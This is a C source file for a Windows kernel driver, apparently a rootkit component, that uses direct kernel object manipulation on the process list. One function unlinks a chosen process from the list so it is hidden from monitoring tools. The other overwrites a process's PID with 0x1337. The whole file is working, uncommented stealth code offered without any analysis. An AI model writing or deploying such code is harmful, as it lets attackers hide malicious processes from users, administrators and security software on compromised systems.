#include "dkom.h"

NTSTATUS proc_unlink(PUINT32 procid)
{
        UINT32 pid = *procid;
        if (!pid)
                return STATUS_SUCCESS;

        PEPROCESS curr_proc = PsGetCurrentProcess();

        PLIST_ENTRY curr_entry = (PLIST_ENTRY)((PUCHAR)curr_proc +
                PROC_LINKS_OFFSET);
        PLIST_ENTRY curr_flink = NULL;
        PLIST_ENTRY curr_blink = curr_entry->Blink;

        while (curr_entry != curr_blink) {
                curr_flink = curr_entry->Flink;
                PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                        PROC_LINKS_OFFSET) + PID_OFFSET);

                if (*curr_pid == pid) {
                        if (MmIsAddressValid(curr_entry))
                                RemoveEntryList(curr_entry);

                        break;
                }
                curr_entry = curr_flink;
        }

        return STATUS_SUCCESS;
}

NTSTATUS proc_set_pid(PUINT32 procid)
{
        UINT32 pid = *procid;
        if (!pid)
                return STATUS_SUCCESS;

        PEPROCESS curr_proc = PsGetCurrentProcess();

        PLIST_ENTRY curr_entry = (PLIST_ENTRY)((PUCHAR)curr_proc +
                PROC_LINKS_OFFSET);
        PLIST_ENTRY curr_flink = NULL;
        PLIST_ENTRY curr_blink = curr_entry->Blink;

        while (curr_entry != curr_blink) {
                curr_flink = curr_entry->Flink;
                PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                        PROC_LINKS_OFFSET) + PID_OFFSET);

                if (*curr_pid == pid) {
                        if (MmIsAddressValid(curr_entry))
                                *curr_pid = 0x1337;

                        break;
                }
                curr_entry = curr_flink;
        }

        return STATUS_SUCCESS;
}